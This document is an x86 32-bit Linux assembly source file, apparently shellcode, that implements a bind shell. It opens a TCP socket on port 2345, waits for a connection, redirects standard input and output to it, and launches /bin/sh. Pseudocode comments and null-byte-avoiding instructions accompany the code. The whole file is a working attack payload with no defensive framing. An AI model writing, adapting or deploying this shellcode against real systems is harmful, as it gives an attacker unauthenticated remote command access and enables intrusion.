        ;; Registers are used for arguments and return values in calls

        ;; struct sockaddr:
        ;; http://beej.us/guide/bgnet/output/html/multipage/sockaddr_inman.html

        ;; Connect example
        ;; http://jakash3.wordpress.com/2011/01/15/assembly-socket-example/

        ;; Daemon
        ;; http://asm.sourceforge.net/articles/linasm-src.html#daemon

        %include "linux/32.asm"
bits 32
        ;; addr   : esp + 12   (16 bytes)
        ;; sock   : esp
        ;; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        ;; addr = {(short int) AF_INET
        ;;       , (short int) 0x2909 // port 2345 - network stack is big endian
        ;;       , (int)       INADDR_ANY
        ;;        };
        ;; sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        ;; bind(sock, &addr, 16);
        ;; listen(sock, 1);
        ;; sock = accept(sock, NULL, NULL);
        ;; dub2(sock, 0); // STD_IN
        ;; dub2(sock, 1); // STD_OUT
        ;; execve("/bin/sh", NULL, NULL);
        ;; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        xor eax, eax
        mov [esp + 12], byte AF_INET
        mov [esp + 13], al
        mov [esp + 14], word #PORT
        mov [esp + 16], eax
        ;; sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        mov al, byte AF_INET
        mov [esp], eax
        mov al, byte SOCK_STREAM
        mov [esp + 4], eax
        mov al, byte IPPROTO_TCP
        mov [esp + 8], eax
        mov al, SYS_socketcall
        xor ebx, ebx
        mov bl, SYS_socketcall_socket
        mov ecx, esp
        int 0x80
        mov [esp], eax
        ;; bind(sock, &addr, 16)
        lea edx, [esp + 12]
        mov [esp + 4], edx
        mov [esp + 8], byte 16
        xor eax, eax
        mov al, SYS_socketcall
        xor ebx, ebx
        mov bl, SYS_socketcall_bind
        mov ecx, esp
        int 0x80
        ;; listen(sock, 1);
        xor eax, eax
        inc eax
        mov [esp + 4], eax
        mov al, SYS_socketcall
        mov bl, SYS_socketcall_listen
        mov ecx, esp
        int 0x80
        ;; sock = accept(sock, NULL, NULL)
        xor eax, eax
        mov [esp + 4], eax
        mov [esp + 8], eax
        mov al, SYS_socketcall
        mov bl, SYS_socketcall_accept
        mov ecx, esp
        int 0x80
        mov [esp], eax
        ;; dub2(sock, 0)
        xor eax, eax
        mov al, SYS_dup2
        mov ebx, [esp]
        xor ecx, ecx
        int 0x80
        ;; dub2(sock, 1)
        xor eax, eax
        mov al, SYS_dup2
        mov ebx, [esp]
        inc ecx
        int 0x80
        ;; Put "/bin//sh" on the stack
        xor eax, eax
        mov [esp], dword "/bin"
        mov [esp + 4], dword "//sh"
        mov [esp + 8], eax
        mov ebx, esp
        ;; execve("/bin/sh", NULL, NULL)
        mov al, SYS_execve
        ;; string pointer already in ebx
        xor ecx, ecx
        xor edx, edx
        int 0x80